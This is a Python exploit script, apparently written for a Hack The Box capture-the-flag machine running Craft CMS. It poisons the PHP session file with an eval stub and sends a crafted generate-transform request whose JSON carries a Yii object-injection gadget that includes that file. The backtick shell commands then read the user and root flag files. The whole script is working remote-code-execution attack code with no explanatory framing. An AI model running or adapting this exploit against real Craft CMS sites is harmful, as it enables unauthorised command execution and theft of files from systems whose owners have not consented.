#!/usr/bin/env python3
import http.client, re, urllib.parse, json, time, random, sys

host = '10.129.54.140'
port = 80

def http_get(path, cookie=None):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
    h = {'Host': 'orion.htb'}
    if cookie: h['Cookie'] = cookie
    c.request('GET', path, headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body, r.getheader('Set-Cookie')

def http_post(path, body, cookie, csrf):
    c = http.client.HTTPConnection('10.129.54.140', 80, timeout=30)
    h = {'Host': 'orion.htb', 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, 'Cookie': cookie, 'Content-Length': str(len(body))}
    c.request('POST', path, body=body.encode(), headers=h)
    r = c.getresponse()
    body = r.read().decode('utf-8', errors='replace')
    c.close()
    return r.status, body

# Get session
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/login', headers={'Host': 'orion.htb'})
r = c.getresponse()
body = r.read().decode('utf-8', errors='replace')
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
sc = r.getheader('Set-Cookie')
session = re.search(r'CraftSessionId=([^;]+)', sc).group(1) if sc else None
c.close()
print('Session:', session)

# Inject stub
c = http.client.HTTPConnection('10.129.54.140', 80, timeout=15)
c.request('GET', '/index.php?p=admin/dashboard&x12345=' + urllib.parse.quote("<?=eval($_GET['x12345']);die()?>"), headers={'Host': 'orion.htb', 'Cookie': 'CraftSessionId=' + session})
r = c.getresponse()
r.read()
c.close()
time.sleep(1)

# Get fresh CSRF
status, body, _ = http_get('/index.php?p=admin/login', 'CraftSessionId=' + session)
m = re.search(r'csrfTokenValue":"([^"]+)"', body)
csrf = m.group(1) if m else None
print('CSRF:', csrf[:20] + '...' if csrf else 'NONE')

# Try with backticks to capture output
body_obj = {'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}
body_json = json.dumps(body_obj)

# Try using backticks to capture output
payload = '`cat /home/adam/user.txt 2>&1`'
status, body = http_post('/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('`cat /home/adam/user.txt 2>&1`'), json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}), 'CraftSessionId=' + session, csrf)
print('User status:', status)

# Search for flag
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] USER FLAG:', m.group(0))
else:
    print('No HTB{ in user response')
    with open('/tmp/user_backtick.html', 'w') as f:
        f.write(body)
    print('Saved to /tmp/user_backtick.html')
    if 'FLAG_START' in body or 'user.txt' in body.lower():
        print('Found user.txt reference')
    print('Last 5000 chars:', body[-5000:])

# Try root
time.sleep(1)
status, body = http_post('/index.php?p=actions/assets/generate-transform&x' + urllib.parse.quote('`cat /root/root.txt 2>&1`'), json.dumps({'assetId': 11, 'handle': {'width': 123, 'height': 456, 'as session': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', 'itemFile': '/var/lib/php/sessions/sess_' + session}}}), 'CraftSessionId=' + session, csrf)
print('Root status:', status)
if 'HTB{' in body:
    m = re.search(r'HTB\{[^}]+\}', body)
    if m:
        print('[+] ROOT FLAG:', m.group(0))
    else:
        print('Root HTB{ found but no match')
    with open('/tmp/root_backtick.html', 'w') as f:
        f.write(body)
    print('Saved to /tmp/root_backtick.html')
else:
    print('No HTB{ in root response')
    with open('/tmp/root_backtick.html', 'w') as f:
        f.write(body)
    print('Last 5000 chars:', body[-5000:])